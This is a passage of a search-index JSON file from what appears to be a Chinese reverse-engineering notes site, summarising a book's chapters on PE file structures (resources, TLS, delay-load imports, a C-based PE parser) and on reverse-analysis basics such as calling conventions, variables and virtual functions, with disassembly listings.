            "text": "以DllDemo.dll为例：   _IMAGE_BASE_RELOCATION 的文件地址偏移为0E00h，其结构如下：        得到数据    virtualAddress：00001000h   sizeOfBlock：00000010h（4个重定位数据：（10h-8h）/2h=4h）   重定位数据：   300Fh  3023h  0000h(用于对齐)  0000h(用于对齐)     重定位地址转换      查看示例文件     当PE加载器需要重定位地址的时候，会使用差值来修正以上地址中的数据", 
            "title": "10.8.3  基址重定位结构实例分析"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第十章-PE文件格式/#109", 
            "text": "分类：   加速键  位图  光标  对话框  图标  菜单  串表（string table）  工具栏  版本信息  等", 
            "title": "10.9  资源"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第十章-PE文件格式/#1091", 
            "text": "结构：3层目录    1层：根目录   2层：对应于资源类型   3层    目录结构图       资源目录结构    数据目录表条目：struct IMAGE_DATA_DIRECTORY Resource，包含资源的RVA和大小    每一个节点的结构定义  c\ntypedef struct _IMAGE_RESOURCE_DIRECTORY {\n    DWORD   Characteristics;\n    DWORD   TimeDateStamp;\n    WORD    MajorVersion;\n    WORD    MinorVersion;\n    WORD    NumberOfNamedEntries;   //以字符串命名的资源数量\n    WORD    NumberOfIdEntries;  //以整形数字命令的资源数量\n//  IMAGE_RESOURCE_DIRECTORY_ENTRY DirectoryEntries[];\n} IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;  总资源数（当前目录的总目录项数） =  NumberOfNamedEntries + NumberOfIdEntries，即 _IMAGE_RESOURCE_DIRECTORY_ENTRY 的数目    资源目录入口结构    c\n  typedef struct _IMAGE_RESOURCE_DIRECTORY_ENTRY {\n      union {\n          struct {\n              DWORD NameOffset:31;\n              DWORD NameIsString:1;\n          };\n          DWORD   Name;\n          WORD    Id;\n      };\n      union {\n          DWORD   OffsetToData;\n          struct {\n              DWORD   OffsetToDirectory:31;\n              DWORD   DataIsDirectory:1;\n          };\n      };\n  } IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY;  字段的含义和层级有关系，层级不同，字段含义也不同    Name字段    第一层：定义资源类型    当资源以类似ID定义并且数值在1-16之间，表示系统预定义，如下     第二层：定义资源名称    第三层：定义代码页编号    最高位：    最高位为0：作为ID使用    最高为为1：做指针使用，指向_IMAGE_RESOURCE_DIR_STRING_U结构  c\n typedef struct _IMAGE_RESOURCE_DIR_STRING_U {\n     WORD    Length;\n     WCHAR   NameString[ 1 ];\n } IMAGE_RESOURCE_DIR_STRING_U, *PIMAGE_RESOURCE_DIR_STRING_U;      OffsetToData字段    类型：指针    高位    高位为1：低位指向下一层目录块的地址    高位为0：指向_IMAGE_RESOURCE_DATA_ENTRY结构  注：当Name和OffsetToData字段做指针使用时：指的是从根目录开始的偏移量，而不是RVA      资源数据入口    经过三层 _IMAGE_RESOURCE_DIRECTORY_ENTRY 之后，offsetToData指向 _IMAGE_RESOURCE_DATA_ENTRY ，其结构如下：  c\n  typedef struct _IMAGE_RESOURCE_DATA_ENTRY {\n      DWORD   OffsetToData;\n      DWORD   Size;\n      DWORD   CodePage;\n      DWORD   Reserved;\n  } IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;   _IMAGE_RESOURCE_DATA_ENTRY 为真正的资源  OffsetToData 指向资源数据指针，为RVA", 
            "title": "10.9.1  资源结构"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第十章-PE文件格式/#1092", 
            "text": "以 pediy.exe 为例    得到资源起始位置：查看数据目录表，得到地址4000h    根目录     _IMAGE_RESOURCE_DIRECTORY_ENTRY 的结构数据：   以第二个 _IMAGE_RESOURCE_DIRECTORY_ENTRY 为例，进入第二层    第二层目录    地址：4040h    总资源数（当前目录的总目录项数） =  NumberOfNamedEntries + NumberOfIdEntries = 0+ 1 = 1  说明其后有一个 _IMAGE_RESOURCE_DIRECTORY_ENTRY    _IMAGE_RESOURCE_DIRECTORY_ENTRY 结构数据：   Name 800000E8h：  定义资源名称  最高位为1，用作指针，指向 _IMAGE_RESOURCE_DIR_STRING_U 结构  _IMAGE_RESOURCE_DIR_STRING_U 的地址 = 资源块首地址 + Name低位地址 = 4000h + E8h = 40E8h  _IMAGE_RESOURCE_DIR_STRING_U 数据：  length: 5  NameString:  PEDIY    OffToData 80000088h：  最高位为1：说明有下一层  低位数据88h: 指向第三层目录块 _IMAGE_RESOURCE_DIECTORY ，地址 = 4000h+88h = 4088h     第三层    _IMAGE_RESOURCE_DIECTORY 地址为：4088h    _IMAGE_RESOURCE_DIECTORY 结构：  总资源数（当前目录的总目录项数） =  NumberOfNamedEntries + NumberOfIdEntries = 0+ 1 =1  说明其后紧跟一个 _IMAGE_RESOURCE_DIRECTORY_ENTRY ，偏移为4098h    _IMAGE_RESOURCE_DIRECTORY_ENTRY 结构：   name（表示代码页编号）:00000409h 代码页为英语  OffsetToData ：  高位为0：表明没有下一层  低位数据：0C8h，指向 _IMAGE_RESOURCE_DATA_ENTRY 结构，地址为：4000h+08Ch = 408Ch     _IMAGE_RESOURCE_DATA_ENTRY 结构：  c\n DWORD   OffsetToData;  //00004400h\n DWORD   Size;          // 0000005Ah\n DWORD   CodePage;\n DWORD   Reserved; \n 真实资源RVA =  4400h，大小为5A", 
            "title": "10.9.2  资源结构实例分析"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第十章-PE文件格式/#1093", 
            "text": "资源类型  VC类标准资源  Delphi类标准资源  非标准的UNICODE资源（主要是一些VB编译程序）  工具  vc++  resource hacker  exescope", 
            "title": "10.9.3  资源编辑工具"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第十章-PE文件格式/#1010-tls", 
            "text": "TLS（线程本地存储器）：将数据和执行的特定线程联系起来    声明TLS变量：__declspce(thread)，该变量将存放在.tls中    过程：    加载器寻找.tls区   动态分配足够大的内存，用来存储TLS变量   将指向该内存的指针，放在TLS数组中，该数组通过FS:[2Ch]访问    数据目录表项： IMAGE_DIRECTORY_ENTRY_TLS    文件头定义结构：    c\n  typedef struct _IMAGE_TLS_DIRECTORY32 {\n      DWORD   StartAddressOfRawData;        //内存起始地址\n      DWORD   EndAddressOfRawData;      //内存终止地址\n      DWORD   AddressOfIndex;             // 运行库使用这个索引来定位线程局部数据\n      DWORD   AddressOfCallBacks;         // PIMAGE_TLS_CALLBACK函数指针数组的地址\n      DWORD   SizeOfZeroFill;\n      DWORD   Characteristics;\n  } IMAGE_TLS_DIRECTORY32;   AddressOfCallBacks  作用：线程建立和退出时的回调函数，列表中的每一个函数都将被执行  包括主线程和其他线程  运行时刻：TLS数据初始化和回调函数都在OEP之前执行，其为程序最开始运行的地方  特殊用途：病毒和外壳程序    结构中地址为虚拟地址，不是RVA  其不位于.tls中，位于.rdata中", 
            "title": "10.10  TLS初始化"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第十章-PE文件格式/#1011_1", 
            "text": "数据目录表：第七个条目，IMAGE_DIRECTORY_ENTRY_DEBUG    结构如下：    c\n  typedef struct _IMAGE_DEBUG_DIRECTORY {\n      DWORD   Characteristics;\n      DWORD   TimeDateStamp;\n      WORD    MajorVersion;\n      WORD    MinorVersion;\n      DWORD   Type;\n      DWORD   SizeOfData;\n      DWORD   AddressOfRawData;\n      DWORD   PointerToRawData;\n  } IMAGE_DEBUG_DIRECTORY, *PIMAGE_DEBUG_DIRECTORY;   普遍形式：pdb", 
            "title": "10.11  调试目录"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第十章-PE文件格式/#1012_1", 
            "text": "延迟装入DLL：    通过LoadLibrary和GetProcessAddress获得延迟函数的地址    直接转向对延迟函数的调用    特征    不是操作系统的特征    通过链接器和运行库加入额外的代码来实现    数据目录表项： DelayLoadImportDescriptors    ImgDelayDescr的结构：    ```c\n  typedef struct ImgDelayDescr {\n      DWORD           grAttrs;        // attributes\n      LPCSTR          szName;         // pointer to dll name\n      HMODULE *       phmod;          // address of module handle\n      PImgThunkData   pIAT;           // address of the IAT\n      PCImgThunkData  pINT;           // address of the INT\n      PCImgThunkData  pBoundIAT;      // address of the optional bound IAT\n      PCImgThunkData  pUnloadIAT;     // address of optional copy of original IAT\n      DWORD           dwTimeStamp;    // 0 if not bound,\n                                      // O.W. date/time stamp of DLL bound to (Old BIND)\n      } ImgDelayDescr, * PImgDelayDescr;  typedef const ImgDelayDescr *   PCImgDelayDescr;  //\n  // Delay load import hook notifications\n  //\n  enum {\n      dliStartProcessing,             // used to bypass or note helper only\n      dliNotePreLoadLibrary,          // called just before LoadLibrary, can\n                                      //  override w/ new HMODULE return val\n      dliNotePreGetProcAddress,       // called just before GetProcAddress, can\n                                      //  override w/ new FARPROC return value\n      dliFailLoadLib,                 // failed to load library, fix it by\n                                      //  returning a valid HMODULE\n      dliFailGetProc,                 // failed to get proc address, fix it by\n                                      //  returning a valid FARPROC\n      dliNoteEndProcessing,           // called after all processing is done, no\n                                      //  no bypass possible at this point except\n                                      //  by longjmp()/throw()/RaiseException.\n      };\n  ```   包含对应DLL的IAT和INT  由运行库代码写入和读出  过程：  第一次调用API函数  运行库调用LoadLibrary  接着调用GetProcessAddress  最后地址装入延迟装入的IAT  以后每次调用直接来到IAT    所有地址都是虚地址", 
            "title": "10.12  延迟装入数据"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第十章-PE文件格式/#1013_1", 
            "text": "基于表的异常处理    表中包含每一个可能受到异常展开影响的函数信息    包含内容：   起始地址  结束地址  异常应该如何处理   在什么地方被执行    异常发生时，遍历这个表，找到合适的入口，并执行    数据成员结构：    c\n  typedef struct _IMAGE_RUNTIME_FUNCTION_ENTRY {\n      DWORD BeginAddress;\n      DWORD EndAddress;\n      DWORD UnwindInfoAddress;\n  } _IMAGE_RUNTIME_FUNCTION_ENTRY, *_PIMAGE_RUNTIME_FUNCTION_ENTRY;", 
            "title": "10.13  程序异常数据"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第十章-PE文件格式/#1014-net", 
            "text": ".Net环境组成：    公共语言运行环境CLR（将其看作虚拟机）    .net框架类库    .net文件主要目的：    获得.net特定的装入内存的信息：   metadata 元数据   IL（Intermediate Language）中间语言    程序执行：    跳转到Mscoree.dll中的 _coreExeMain 或者 _coreDllMain    Mscoree.dll开始使用metadata和IL    程序目录表项：struct IMAGE_DATA_DIRECTORY  COMRuntimedescriptor", 
            "title": "10.14  .Net头部"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第十章-PE文件格式/#1015-pe", 
            "text": "定义文件结构：  typedef struct _MAP_FILE_STRUCT\n{\n    HANDLE hFile;\n    HANDLE hMapping;\n    LPVOID ImageBase;\n}  MAP_FILE_STRUCT,* PMAP_FILE_STRUCT;", 
            "title": "10.15  编写PE分析工具"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第十章-PE文件格式/#10151", 
            "text": "BOOL IsPEFile(LPVOID ImageBase)\n{\n    PIMAGE_DOS_HEADER  pDH=NULL;\n    PIMAGE_NT_HEADERS  pNtH=NULL;\n\n    if(!ImageBase)      //判断映像基址\n      return FALSE;\n\n    pDH=(PIMAGE_DOS_HEADER)ImageBase;\n    if(pDH- e_magic!=IMAGE_DOS_SIGNATURE)   //判断是否为MZ\n         return FALSE;\n\n    pNtH=(PIMAGE_NT_HEADERS32)((DWORD)pDH+pDH- e_lfanew);   //判断是否为PE\n    if (pNtH- Signature != IMAGE_NT_SIGNATURE )\n        return FALSE;\n\n    return TRUE;\n\n}", 
            "title": "10.15.1  文件格式检查"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第十章-PE文件格式/#10152-fileheaderoptionalheader", 
            "text": "GetNtHeaders   ```c\n   PIMAGE_NT_HEADERS  GetNtHeaders(LPVOID ImageBase)\n   {  if(!IsPEFile(ImageBase))\n    return NULL;\nPIMAGE_NT_HEADERS  pNtH;\nPIMAGE_DOS_HEADER  pDH;\npDH=(PIMAGE_DOS_HEADER)ImageBase;\npNtH=(PIMAGE_NT_HEADERS)((DWORD)pDH+pDH- e_lfanew);\n\nreturn pNtH;  }  ```   GetFileHeader   ```c\n   PIMAGE_FILE_HEADER   GetFileHeader(LPVOID ImageBase)\n   {\n       PIMAGE_DOS_HEADER  pDH=NULL;\n       PIMAGE_NT_HEADERS  pNtH=NULL;\n       PIMAGE_FILE_HEADER pFH=NULL;     if(!IsPEFile(ImageBase))\n    return NULL;\n   pDH=(PIMAGE_DOS_HEADER)ImageBase;\n   pNtH=(PIMAGE_NT_HEADERS)((DWORD)pDH+pDH- e_lfanew);\n   pFH= pNtH- FileHeader;\n   return pFH;  }\n   ```   GetOptionalHeader   ```c\n   PIMAGE_OPTIONAL_HEADER GetOptionalHeader(LPVOID ImageBase)\n   {\n       PIMAGE_DOS_HEADER  pDH=NULL;\n       PIMAGE_NT_HEADERS  pNtH=NULL;\n       PIMAGE_OPTIONAL_HEADER pOH=NULL;      if(!IsPEFile(ImageBase))\n    return NULL;\n   pDH=(PIMAGE_DOS_HEADER)ImageBase;\n   pNtH=(PIMAGE_NT_HEADERS)((DWORD)pDH+pDH- e_lfanew);\n   pOH= pNtH- OptionalHeader;\n   return pOH;  }\n   ```   显示文件头信息   ```c\n   void    ShowFileHeaderInfo(HWND hWnd)\n   {   \n    char   cBuff[10];\n        PIMAGE_FILE_HEADER pFH=NULL;   pFH=GetFileHeader(stMapFile.ImageBase);\n    if(!pFH)\n {\n     MessageBox(hWnd,\"Can't get File Header ! :(\",\"PEInfo_Example\",MB_OK);\n     return;\n }\n wsprintf(cBuff, \"%04lX\", pFH- Machine);\n SetDlgItemText(hWnd,IDC_EDIT_FH_MACHINE,cBuff);\n\n wsprintf(cBuff, \"%04lX\", pFH- NumberOfSections);\n SetDlgItemText(hWnd,IDC_EDIT_FH_NUMOFSECTIONS,cBuff);\n\n wsprintf(cBuff, \"%08lX\", pFH- TimeDateStamp);\n SetDlgItemText(hWnd,IDC_EDIT_FH_TDS,cBuff);\n\n wsprintf(cBuff, \"%08lX\", pFH- PointerToSymbolTable);\n SetDlgItemText(hWnd,IDC_EDIT_FH_PTSYMBOL,cBuff);\n\n wsprintf(cBuff, \"%08lX\", pFH- NumberOfSymbols);\n SetDlgItemText(hWnd,IDC_EDIT_FH_NUMOFSYM,cBuff);\n\n wsprintf(cBuff, \"%04lX\", pFH- SizeOfOptionalHeader);\n SetDlgItemText(hWnd,IDC_EDIT_FH_SIZEOFOH,cBuff);\n\n wsprintf(cBuff, \"%04lX\", pFH- Characteristics);\n SetDlgItemText(hWnd,IDC_EDIT_FH_CHARACTERISTICS,cBuff);  }\n   ```", 
            "title": "10.15.2  FileHeader和OptionalHeader内容的读取"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第十章-PE文件格式/#10153", 
            "text": "void ShowDataDirInfo(HWND hDlg)\n{\n    char   cBuff[9];\n    PIMAGE_OPTIONAL_HEADER pOH=NULL;\n    pOH=GetOptionalHeader(stMapFile.ImageBase);\n   if(!pOH)\n        return;\n\n    for(int i=0;i 16;i++)\n   {\n    wsprintf(cBuff,  %08lX , pOH- DataDirectory[i].VirtualAddress);\n    SetDlgItemText(hDlg,EditID_Array[i].ID_RVA,cBuff);\n\n     wsprintf(cBuff,  %08lX , pOH- DataDirectory[i].Size);\n     SetDlgItemText(hDlg,EditID_Array[i].ID_SIZE,cBuff);\n    }\n\n}", 
            "title": "10.15.3  得到数据目录表信息"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第十章-PE文件格式/#10154", 
            "text": "void ShowSectionHeaderInfo(HWND hDlg)\n{\n    LVITEM                  lvItem;\n    char                    cBuff[9],cName[9]; \n    WORD                    i;\n    PIMAGE_FILE_HEADER       pFH=NULL;\n    PIMAGE_SECTION_HEADER   pSH=NULL;\n\n\n    pFH=GetFileHeader(stMapFile.ImageBase);\n    if(!pFH)\n        return;\n\n    pSH=GetFirstSectionHeader(stMapFile.ImageBase);\n\n    for( i=0;i pFH- NumberOfSections;i++)\n    {\n        memset( lvItem, 0, sizeof(lvItem));\n        lvItem.mask    = LVIF_TEXT;\n        lvItem.iItem   = i;\n\n        memset(cName,0,sizeof(cName));\n        memcpy(cName, pSH- Name, 8);\n\n        lvItem.pszText = cName;\n        SendDlgItemMessage(hDlg,IDC_SECTIONLIST,LVM_INSERTITEM,0,(LPARAM) lvItem);\n\n        lvItem.pszText  = cBuff;\n        wsprintf(cBuff,  %08lX , pSH- VirtualAddress);\n        lvItem.iSubItem = 1;\n        SendDlgItemMessage(hDlg,IDC_SECTIONLIST, LVM_SETITEM, 0, (LPARAM) lvItem);\n        ...\n\n        ++pSH;\n    }", 
            "title": "10.15.4  得到区块表信息"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第十章-PE文件格式/#10155", 
            "text": "void   ShowExportFuncsInfo(HWND hDlg)\n{\n    HWND         hList;\n    LVITEM       lvItem;\n    char         cBuff[10], *szFuncName; \n\n    UINT                    iNumOfName=0;\n    PDWORD                  pdwRvas, pdwNames;\n    PWORD                   pwOrds;\n    UINT                    i=0,j=0,k=0; \n    BOOL                    bIsByName=FALSE;;\n\n\n    PIMAGE_NT_HEADERS       pNtH=NULL;\n    PIMAGE_EXPORT_DIRECTORY pExportDir=NULL;\n\n    pNtH=GetNtHeaders(stMapFile.ImageBase);\n    if(!pNtH)\n        return ;\n    pExportDir= (PIMAGE_EXPORT_DIRECTORY)GetExportDirectory(stMapFile.ImageBase);\n    if (!pExportDir)\n            return ; \n\n\n    pwOrds    = (PWORD)RvaToPtr(pNtH, stMapFile.ImageBase,pExportDir- AddressOfNameOrdinals);\n    pdwRvas   = (PDWORD)RvaToPtr(pNtH, stMapFile.ImageBase,pExportDir- AddressOfFunctions);\n    pdwNames  = (PDWORD)RvaToPtr(pNtH, stMapFile.ImageBase,pExportDir- AddressOfNames);\n\n    if(!pdwRvas)\n        return;\n\n    hList=GetDlgItem(hDlg,IDC_EXPORT_LIST);\n    SendMessage(hList,LVM_SETEXTENDEDLISTVIEWSTYLE,0,(LPARAM)LVS_EX_FULLROWSELECT);\n\n\n    iNumOfName=pExportDir- NumberOfNames;\n\n    for( i=0;i pExportDir- NumberOfFunctions;i++)\n    {\n        if(*pdwRvas)\n        {    \n            for( j=0;j iNumOfName;j++)\n            {\n                if(i==pwOrds[j])\n                {  \n                    bIsByName=TRUE;\n                    szFuncName=(char*)RvaToPtr(pNtH,stMapFile.ImageBase,pdwNames[j]);\n                    break;\n                }\n\n                bIsByName=FALSE;\n            }\n\n            //show funcs to listctrl\n\n        memset( lvItem, 0, sizeof(lvItem));\n        lvItem.mask    = LVIF_TEXT;\n        lvItem.iItem   = k;\n\n        lvItem.pszText = cBuff;\n        wsprintf(cBuff,  %04lX , (UINT)(pExportDir- Base+i));\n        SendDlgItemMessage(hDlg,IDC_EXPORT_LIST,LVM_INSERTITEM,0,(LPARAM) lvItem);\n\n        lvItem.pszText  = cBuff;\n        wsprintf(cBuff,  %08lX , (*pdwRvas));\n        lvItem.iSubItem = 1;\n        SendDlgItemMessage(hDlg,IDC_EXPORT_LIST, LVM_SETITEM, 0, (LPARAM) lvItem);\n\n        if(bIsByName)           \n            lvItem.pszText=szFuncName;\n        else\n            lvItem.pszText  =  - ;\n\n        lvItem.iSubItem = 2;\n        SendDlgItemMessage(hDlg,IDC_EXPORT_LIST, LVM_SETITEM, 0, (LPARAM) lvItem);\n\n\n           //\n        ++k;\n\n        }\n\n            ++pdwRvas;\n\n }", 
            "title": "10.15.5  得到输出表信息"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第十章-PE文件格式/#10156", 
            "text": "找到输入表的位置   PIMAGE_IMPORT_DESCRIPTOR  GetFirstImportDesc(LPVOID ImageBase)\n{\n    PIMAGE_IMPORT_DESCRIPTOR pImportDesc;\n    pImportDesc=(PIMAGE_IMPORT_DESCRIPTOR)GetDirectoryEntryToData(ImageBase,IMAGE_DIRECTORY_ENTRY_IMPORT);\n    if(!pImportDesc)\n        return NULL;     \n    return  pImportDesc;\n}   循环输出整个表   void  ShowImportDescInfo(HWND hDlg)\n{\n    HWND         hList;\n    LVITEM       lvItem;\n    char         cBuff[10], * szDllName; \n\n    PIMAGE_NT_HEADERS       pNtH=NULL;\n    PIMAGE_IMPORT_DESCRIPTOR  pImportDesc=NULL;\n\n    memset( lvItem, 0, sizeof(lvItem));\n\n    hList=GetDlgItem(hDlg,IDC_IMPORT_LIST);\n    SendMessage(hList,LVM_SETEXTENDEDLISTVIEWSTYLE,0,(LPARAM)LVS_EX_FULLROWSELECT);\n\n    pNtH=GetNtHeaders(stMapFile.ImageBase);\n    pImportDesc=GetFirstImportDesc(stMapFile.ImageBase);\n    if(!pImportDesc)\n    {\n        MessageBox(hDlg, Can't get ImportDesc:( , PEInfo_Example ,MB_OK);\n        return;\n    }\n\n    int i=0;\n    while(pImportDesc- FirstThunk)\n    {\n\n        memset( lvItem, 0, sizeof(lvItem));\n        lvItem.mask    = LVIF_TEXT;\n        lvItem.iItem   = i;\n\n        szDllName=(char*)RvaToPtr(pNtH,stMapFile.ImageBase,pImportDesc- Name);\n\n...\n       ++i;\n       ++pImportDesc;\n    }\n\n}", 
            "title": "10.15.6  得到输入表信息"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第四章-逆向分析技术/", 
            "text": "加密与解密 第2篇 调试篇\n\n\n第4章 逆向分析技术\n\n\n4.1 启动函数\n\n\n\n\nc/c++运行时启动函数作用\n\n\n检索指向新进程的命令行指针\n\n\n检索指向新进程的环境变量指针\n\n\n全局变量初始化\n\n\n内存堆栈初始化\n\n\n\n\n00401020 \n/$  55            push    ebp\n00401021  |.  8BEC          mov     ebp, esp\n00401023  |.  6A FF         push    -1\n00401025  |.  68 A0504000   push    004050A0\n0040102A  |.  68 7C1C4000   push    00401C7C                         ;  SE 处理程序安装\n0040102F  |.  64:A1 0000000\nmov     eax, dword ptr fs:[0]\n00401035  |.  50            push    eax\n00401036  |.  64:8925 00000\nmov     dword ptr fs:[0], esp\n0040103D  |.  83EC 10       sub     esp, 10\n00401040  |.  53            push    ebx\n00401041  |.  56            push    esi\n\n\n\n\n4.2 函数\n\n\n4.2.1 函数的识别\n\n\n\n\nCALL\n\n\nRET\n\n\n\n\n4.2.2 函数的参数\n\n\n利用堆栈传递\n\n\n00401000 \n/$  6A 04         push    4                                ; /Arg2 = 00000004\n00401002  |.  6A 03         push    3                                ; |Arg1 = 00000003\n00401004  |.  E8 16000000   call    0040101F                         ; \\Add.0040101F\n00401009  |.  8BD8          mov     ebx, eax\n0040100B  |.  6A 00         push    0                                ; /ExitCode = 0\n0040100D  \\.  FF15 00204000 call    [\nKERNEL32.ExitProcess\n]        ; \\ExitProcess\n\n\n0040101F  /$  55            push    ebp                              ;  保护现场原先的EBP指针\n00401020  |.  8BEC          mov     ebp, esp                         ;  设置新的EBP指针，指向栈顶\n00401022  |.  83EC 04       sub     esp, 4                           ;  分配局部变量所有空间\n00401025  |.  8B45 0C       mov     eax, [ebp+C]                     ;  调用参数2\n00401028  |.  8B5D 08       mov     ebx, [ebp+8]                     ;  调用参数1\n0040102B  |.  895D FC       mov     [ebp-4] , ebx                    ;  参数1放局部变量里\n0040102E  |.  0345 FC       add     eax,[ebp-4]                      ;  参数2与局部变量相加\n00401031  |.  83C4 04       add     esp, 4                           ;  释放局部变量所有空间\n00401034  |.  5D            pop     ebp                              ;  恢复现场的ebp指针\n00401035  \\.  C2 0800       retn    8\n\n\n\n\n\n\nenter/leave\n\n\n\n\nenter = push ebp/move ebp,esp/sub esp,xxx\n\n   \nleave = add esp,xxx/pop esp\n\n\nasm\n  enter xxx,0   ;0表示创建xxx放局部变量\n  ...\n  leave \n  ret 8\n\n\n\n\nvc6.0 使用\nmaximize speed\n\n\n\n\nasm\n  push par2 ;参数2\n  push par1 ;参数1\n  call test2\n  {\n    move eax, dword ptr [esp+04] ;调用参数1\n      move ecx, dword ptr [esp+08] ;调用参数2\n      ...\n      ret 8\n  }\n\n\n利用寄存器传递变量\n\n\n\n\n规范：__fastcall\n\n\n\n\n```c\n  /\n*\n*\n*\n*\n*\n*\n*\n*\n\n  *  fastcall调用                                                                                                   \n\n  *   (c)  看雪软件安全网站 www.pediy.com 2000-2008                         *\n  \n*\n*\n*\n*\n*\n*\n*\n*\n/\n\n\nint  __fastcall Add(char,long,int,int);\n\n\nmain(void)\n   {\n        Add(1,2,3,4);\n        return 0;\n   }\n\n\nint __fastcall Add(char a, long b, int c, int d)\n\n\n{\n       return (a + b + c + d);\n  }\n\n\n```\n\n\nvc编译： \noptimizations:default\n\n\n名称修饰约定\n\n\n\n\nname mangling/name decoration\n\n\n同一名字具有不同的参数或者不同的作用域\n\n\nc编译时函数名修饰约定规则：\n\n\n__stdcall调用约定：_{functionname}@{byte_number}\n\n\n_cdel调用约定：_{functionname}\n\n\n__fastcall调用约定：@{functionname}@{byte_number}\n\n\n\n\n4.2.3 函数的返回值\n\n\n0x1 用return返回\n\n\n0x2 通过参数按引用方式返回\n\n\n4.3 数据结构\n\n\n4.3.1 局部变量\n\n\n\n\n\n\n利用堆栈\n\n\n\n\n\n\nsub esp,8\n\n\n\n\n\n\n调用格式：\n\n\n\n\n局部：[ebp-xxxx]\n\n\n参数调用：[ebp+xxxx]\n\n\n\n\n\n\n\n\n局部变量与清除堆栈的几种形式\n\n\n\n\n\n\n\n\n形式一\n\n\n形式二\n\n\n形式三\n\n\n\n\n\n\n\n\n\n\nsub esp,n\nadd esp,n\n\n\nadd esp,-n\nsub esp,-n\n\n\npush reg\npop reg\n\n\n\n\n\n\n\n\n\n\n\n\n局部变量初始化\n\n\n\n\nmov [ebp-04],5\n\n\npush 5\n\n\n\n\n\n\n\n\n利用寄存器\n\n\n\n\n\n\n除了堆栈占用2个寄存器外，编译器会利用剩下的6个通用寄存器\n\n\n4.3.2 全局变量\n\n\n\n\n\n\n位于.data段中\n\n\n\n\n\n\n格式：\n\n\n\n\n\n\nasm\n  move eax,dword ptr [4084c0h]\n\n\n\n\n\n\n作用：\n\n\n\n\n\n\n传递参数\n\n\n\n\n\n\n传递函数返回值\n\n\n\n\n\n\n示例\n\n\n\n\n\n\n```c\n  /\n*\n*\n*\n*\n*\n*\n*\n*\n*\n  《加密与解密》第三版配套实例\n                                        4.3.2  全局变量\n  (c)  看雪软件安全网站 www.pediy.com 2000-2008\n  \n*\n*\n*\n*\n*\n*\n*\n*\n/\n  int z;\n\n\nint add(int x,int y);\n  int main(void)\n   {\n     int a=5,b=6;\n     z=7;\n     add(a,b);\n     return 0;\n   }\n\n\nint add(int x,int y)\n   {\n     return(x+y+z);\n   }\n  ```\n\n\nvc++6.0编译，选择不优化\n\n\n\n\n与静态变量类似，但静态变量只在定义这些变量的函数内有效\n\n\n\n\n4.3.3  数组\n\n\n\n\n\n\n实现方式：基址+变量\n\n\n\n\n\n\n示例：\n\n\n\n\n\n\n```c\n  /\n*\n*\n*\n*\n*\n*\n*\n*\n*\n  《加密与解密》第三版配套实例\n                                        4.3.3 数组\n  (c)  看雪软件安全网站 www.pediy.com 2000-2008\n  \n*\n*\n*\n*\n*\n*\n*\n*\n/\n\n\n#include \n\n\nint main(void)\n  {\n    static int a[3]={0x11,0x22,0x33};\n      int i,s=0,b[3];\n    for(i=0;i\n3;i++)\n    { \n        s=s+a[i];\n        b[i]=s;\n    }\n\n\nfor(i=0;i\n3;i++)\n{\n    printf(\"%d\\n\",b[i]);\n}\n\nreturn 0;\n\n\n\n}\n\n\n```\n\n\n编译优化选项：最快速度，但是我build出现了错误：\n\n\n\n\nCommand line error D2016 : '/O2' and '/GZ' command-line options are incompatible\n执行 cl.exe 时出错.\n\n\n\n\n\n\n/GZ 可以帮助捕获内存错误 \n\n\n/O1 或 /O2 优化开关，使程序最小或最快 \n\n\n\n\n既然两个选项不兼容，那么就把/GZ去掉，编译成功 :happy:\n\n\n\n\nsample\n\n\n\n\nasm\n  mov eax,[407030h+eax]\n\n\n\n\n\n\n数组存在位置\n\n\n\n\n\n\n堆栈\n\n\n\n\n数据段 .data\n\n\n\n\n动态内存\n\n\n\n\n\n\n间接寻址一般出现在：\n\n\n\n\n\n\n数组\n\n\n\n\n\n\n结构赋值\n\n\n\n\n\n\n[基址+寄存器]\n\n\n\n\n\n\n基址可以为常量或者是寄存器\n\n\n\n\n\n\n4.4  虚函数\n\n\n\n\n\n\n虚函数的地址：在调用之前加以确定\n\n\n\n\n\n\n虚函数表（Virtual Table，VTBL）：存放虚函数的引用\n\n\n\n\n\n\n虚函数表指针（Virtual Table Pointer,VPTR）:指向对象中的函数\n\n\n\n\n\n\n示例：\n\n\n\n\n\n\n```c\n  /\n*\n*\n*\n*\n*\n*\n*\n*\n*\n  《加密与解密》第三版配套实例\n                                      4.4 虚函数\n  (c)  看雪软件安全网站 www.pediy.com 2000-2008\n  \n*\n*\n*\n*\n*\n*\n*\n*\n/\n\n\n#include \n\n  class CSum\n  {\n  public:\n    virtual int Add(int a, int b) \n    {\n        return (a + b);\n    }\n\n\nvirtual int Sub(int a, int b )\n{\n    return (a - b);\n}\n\n\n\n};\n\n\nvoid main()\n  { \n\n    CSum*   pCSum = new CSum ;  \n\n\npCSum-\nAdd(1,2);\npCSum-\nSub(1,2);\n\n\n\n} \n\n\n```\n\n\n汇编代码：\n\n\nasm\n  00401030 \n \n \\56            push esi\n  00401031   .  6A 04         push 0x4\n  00401033   .  E8 88000000   call Calling_.operator new\n  00401038   .  83C4 04       add esp,0x4\n  0040103B   .  85C0          test eax,eax\n  0040103D   .  74 0A         je XCalling_.00401049\n  0040103F   .  C700 